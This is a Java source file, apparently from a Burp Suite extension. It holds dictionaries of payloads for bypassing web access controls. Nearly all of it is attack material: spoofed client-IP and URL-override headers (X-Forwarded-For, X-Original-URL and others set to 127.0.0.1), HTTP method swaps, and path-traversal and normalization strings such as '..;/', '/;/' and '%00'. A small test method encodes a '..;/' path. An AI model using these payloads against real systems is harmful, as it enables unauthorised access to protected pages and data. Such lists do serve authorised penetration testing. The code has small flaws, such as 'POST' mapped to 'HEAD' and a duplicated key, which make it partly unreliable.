package burp;

import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

/**
 * @auther Skay
 * @date 2022/1/7 16:09
 * @description
 */
public class Payload {
    public HashMap<String,String> HeaderPayload = new HashMap<>();
    public HashMap<String,String> ProtocolPayload = new HashMap<>();
    public HashMap<String,String> PortPayload = new HashMap<>();
    public HashMap<String,String> MethodPayload = new HashMap<>();
    public HashMap<String,String> EncodePayload = new HashMap<>();
    public HashMap<String,String> MiscPayload = new HashMap<>();

    Payload(){
        this.HeaderPayload.put("X-Originally-Forwarded-For","X-Originally-Forwarded-For: 127.0.0.1");
        this.HeaderPayload.put("X-Originating-IP","X-Originating-IP: 127.0.0.1");
        this.HeaderPayload.put("True-Client-IP","True-Client-IP: 127.0.0.1");
        this.HeaderPayload.put("X-WAP-Profile","X-WAP-Profile: 127.0.0.1");
        this.HeaderPayload.put("Profile","Profile: http://${domain}");
        this.HeaderPayload.put("X-Arbitrary","X-Arbitrary: http://${domain}");
        this.HeaderPayload.put("X-HTTP-DestinationURL","X-HTTP-DestinationURL: http://${domain}");
        this.HeaderPayload.put("X-Forwarded-Proto","X-Forwarded-Proto: http://${domain}");
        this.HeaderPayload.put("Destination","Destination: 127.0.0.1");
        this.HeaderPayload.put("Proxy","Proxy: 127.0.0.1");
        this.HeaderPayload.put("CF-Connecting_IP","CF-Connecting_IP: 127.0.0.1");
        this.HeaderPayload.put("Referer","Referer: ${domain}");
        this.HeaderPayload.put("X-Custom-IP-Authorization","X-Custom-IP-Authorization: 127.0.0.1");
        this.HeaderPayload.put("X-Originating-IP","X-Originating-IP: 127.0.0.1");
        this.HeaderPayload.put("X-Forwarded-For","X-Forwarded-For: 127.0.0.1");
        this.HeaderPayload.put("X-Remote-IP","X-Remote-IP: 127.0.0.1");
        this.HeaderPayload.put("X-Client-IP","X-Client-IP: 127.0.0.1");
        this.HeaderPayload.put("X-Host","X-Host: 127.0.0.1");
        this.HeaderPayload.put("X-Forwarded-Host","X-Forwarded-Host: 127.0.0.1");
        this.HeaderPayload.put("X-Original-URL","/${path}");
        this.HeaderPayload.put("Content-Length","Content-Length: 0");
        this.HeaderPayload.put("X-ProxyUser-Ip","X-ProxyUser-Ip: 127.0.0.1");
        this.HeaderPayload.put("Base-Url:","Base-Url: 127.0.0.1");
        this.HeaderPayload.put("Client-IP","Client-IP: 127.0.0.1");
        this.HeaderPayload.put("Http-Url","Http-Url: 127.0.0.1");
        this.HeaderPayload.put("Proxy-Host","Proxy-Host: 127.0.0.1");
        this.HeaderPayload.put("Proxy-Url","Proxy-Url: 127.0.0.1");
        this.HeaderPayload.put("Real-Ip","Real-Ip: 127.0.0.1");
        this.HeaderPayload.put("Redirect","Redirect: 127.0.0.1");
        this.HeaderPayload.put("Request-Uri","Request-Uri: 127.0.0.1");
        this.HeaderPayload.put("Uri","Uri: 127.0.0.1");
        this.HeaderPayload.put("X-Forwarded-By","X-Forwarded-By: 127.0.0.1");
        this.HeaderPayload.put("X-Forwarded-For-Original","X-Forwarded-For-Original: 127.0.0.1");
        this.HeaderPayload.put("X-Forwarded-Server","X-Forwarded-Server: 127.0.0.1");
        this.HeaderPayload.put("X-Forwarded","X-Forwarded: 127.0.0.1");
        this.HeaderPayload.put("X-Forwarder-For","X-Forwarder-For: 127.0.0.1");
        this.HeaderPayload.put("X-Http-Destinationurl","X-Http-Destinationurl: 127.0.0.1");
        this.HeaderPayload.put("X-Http-Host-Override","X-Http-Host-Override: 127.0.0.1");
        this.HeaderPayload.put("X-Original-Remote-Addr","X-Original-Remote-Addr: 127.0.0.1");
        this.HeaderPayload.put("X-Proxy-Url","X-Proxy-Url: 127.0.0.1");
        this.HeaderPayload.put("X-Real-Ip","X-Real-Ip: 127.0.0.1");
        this.HeaderPayload.put("X-Remote-Addr","X-Remote-Addr: 127.0.0.1");
        this.HeaderPayload.put("X-OReferrer","X-OReferrer: https%3A%2F%2Fwww.google.com%2F");
        this.HeaderPayload.put("X-Forwarded-Scheme_http","X-Forwarded-Scheme: http");
        this.HeaderPayload.put("X-Forwarded-Scheme_https","X-Forwarded-Scheme: https");
        this.HeaderPayload.put("X-Forwarded-Port443","X-Forwarded-Port: 443");
        this.HeaderPayload.put("X-Forwarded-Port4443","X-Forwarded-Port: 4443");
        this.HeaderPayload.put("X-Forwarded-Port80","X-Forwarded-Port: 80");
        this.HeaderPayload.put("X-Forwarded-Port8080","X-Forwarded-Port: 8080");
        this.HeaderPayload.put("X-Forwarded-Port8443","X-Forwarded-Port: 8443");


        this.ProtocolPayload.put("http","http");
        this.ProtocolPayload.put("https","https");
        this.ProtocolPayload.put("X-Forwarded-Scheme_http","X-Forwarded-Scheme: http");
        this.ProtocolPayload.put("X-Forwarded-Scheme_https","X-Forwarded-Scheme: https");

        this.PortPayload.put("X-Forwarded-Port443","X-Forwarded-Port: 443");
        this.PortPayload.put("X-Forwarded-Port4443","X-Forwarded-Port: 4443");
        this.PortPayload.put("X-Forwarded-Port80","X-Forwarded-Port: 80");
        this.PortPayload.put("X-Forwarded-Port8080","X-Forwarded-Port: 8080");
        this.PortPayload.put("X-Forwarded-Port8443","X-Forwarded-Port: 8443");

        this.MethodPayload.put("GET","GET");
        this.MethodPayload.put("POST","HEAD");
        this.MethodPayload.put("OPTIONS","OPTIONS");
        this.MethodPayload.put("PUT","PUT");
        this.MethodPayload.put("TRACE","TRACE");
        this.MethodPayload.put("PATCH","PATCH");
        this.MethodPayload.put("TRACK","TRACK");
        this.MethodPayload.put("UPDATE","UPDATE");
        this.MethodPayload.put("LOCK","LOCK");

        this.EncodePayload.put("Unicode","");//%u003b%u002f%u002e%u002e%u002f%u003b
        this.EncodePayload.put("URLEncode","");
        this.EncodePayload.put("URLEncodeDouble","");
        this.EncodePayload.put("Encode;","");
        this.EncodePayload.put("Encode.","");
        this.EncodePayload.put("EncodeDouble;","");
        this.EncodePayload.put("EncodeDouble.","");
        this.EncodePayload.put("Encode/","");
        this.EncodePayload.put("Encode\\","");
        this.EncodePayload.put("Encode;.","");
        this.EncodePayload.put("Encode;\\","");
        this.EncodePayload.put("Encode;/","");
        this.EncodePayload.put("Encode\\/","");
        this.EncodePayload.put("Encode./","");
        this.EncodePayload.put("Encode.\\","");
        this.EncodePayload.put("EncodeOnebyOne",""); //特定的字符OnebyOne

        //上面那些的基础上再来个单次url编码后 %单独编码一次
//        this.EncodePayload.put("1Encode;","");
//        this.EncodePayload.put("1Encode.","");
//        this.EncodePayload.put("1EncodeDouble;","");
//        this.EncodePayload.put("1EncodeDouble.","");
//        this.EncodePayload.put("1Encode/","");
//        this.EncodePayload.put("1Encode\\","");
//        this.EncodePayload.put("1Encode;.","");
//        this.EncodePayload.put("1Encode;\\","");
//        this.EncodePayload.put("1Encode;/","");
//        this.EncodePayload.put("1Encode\\/","");
//        this.EncodePayload.put("1Encode./","");
//        this.EncodePayload.put("1Encode.\\","");

        //分号编码 ..编码 分号双编码 ..双编码 斜杠 反斜杠 一起编码 一起双编码 单次url编码后 %单独编码
        this.MiscPayload.put("Tab","%09");
        this.MiscPayload.put("Tab;","\t;");
        this.MiscPayload.put("Tab..","\t..");
        this.MiscPayload.put("Spach"," ");
        this.MiscPayload.put("%23?","#?");
        this.MiscPayload.put("//","//");
        this.MiscPayload.put("/","/");
        this.MiscPayload.put("/..","/..");
        this.MiscPayload.put("../","../");
        this.MiscPayload.put("/ %23","/ #");
        this.MiscPayload.put("/%23","/%23");
        this.MiscPayload.put("/;/","/;/");
        this.MiscPayload.put("/;//","/;//");
        this.MiscPayload.put("/?","/?");
        this.MiscPayload.put(";",";");
        this.MiscPayload.put(";Tab",";\t");
        this.MiscPayload.put(";/..",";/..");
        this.MiscPayload.put(";/../..//",";/../..//");
        this.MiscPayload.put(";///../",";///../");
        this.MiscPayload.put("?%23","?%23");
        this.MiscPayload.put("??","??");
        this.MiscPayload.put("..","..");
        this.MiscPayload.put("..\t","..\t");
        this.MiscPayload.put("..%0d/;","..%0d/;");
        this.MiscPayload.put("..%0d;/","..%0d;/");
        this.MiscPayload.put("..\\/","..\\/");
        this.MiscPayload.put("..%ff/;","..%ff/;");
        this.MiscPayload.put("..%ff;/","..%ff;/");
        this.MiscPayload.put("..;%0d","..;%0d");
        this.MiscPayload.put("..;%ff","..;%ff");
        this.MiscPayload.put("..;\\","..;\\");
        this.MiscPayload.put("..;\\;","..;\\;");
        this.MiscPayload.put("..\\;","..\\;");
        this.MiscPayload.put("..;/","..;/");
        this.MiscPayload.put("..;\\/","..;\\/");
        this.MiscPayload.put("./","./");
        this.MiscPayload.put(".\\","");
        this.MiscPayload.put("/*","/*");
        this.MiscPayload.put("\\*","\\*");
        this.MiscPayload.put("/;/;/;/","/;/;/;/");
        this.MiscPayload.put("/;a/;b/","/;a/;b/");
        this.MiscPayload.put(".js",".js");
        this.MiscPayload.put(".png",".png");
        this.MiscPayload.put("%00","%00");


    }

    public static void main(String[] args) throws UnsupportedEncodingException, MalformedURLException {
        String url = "http://aaa.com/aaa/bbb/..;/ccc?";
//        String tmpurla = url.substring(url.indexOf("://")+3);
//        String tmphttp = url.substring(0,url.indexOf("://")+3);
//        System.out.println(tmphttp+URLEncoder.encode(URLEncoder.encode(tmpurla, "UTF-8")));
//        System.out.println(new URL("http://aaa.com/aaa/bbb/..;/ccc").getPath());

        String encodepath = new URL(url).getPath();
        String encodeurl = url.substring(0,url.indexOf(encodepath))+encodepath.replace(".", "%2E");

        System.out.println(encodeurl);
//        System.out.println(URLEncoder.encode(url, "UTF-8"));
//        String tmpurl = String.valueOf(new StringBuffer(url).reverse());
//        String tmpurl1 = tmpurl.replaceFirst(".","*aa*");
//        String tmpurl2 = new StringBuffer(tmpurl1).reverse().toString();
//
//
//        System.out.println(tmpurl2.replace("*aa*","*/"));
//        System.out.println(tmpurl2.replace("*aa*","*/"));
//
//        String tmpurla = url.substring(url.indexOf("://")+3);
//        String tmurlb = url.substring(0,url.indexOf("://")+3);
//        System.out.println(tmurlb+tmpurla.replace("/","/./"));
    }
}
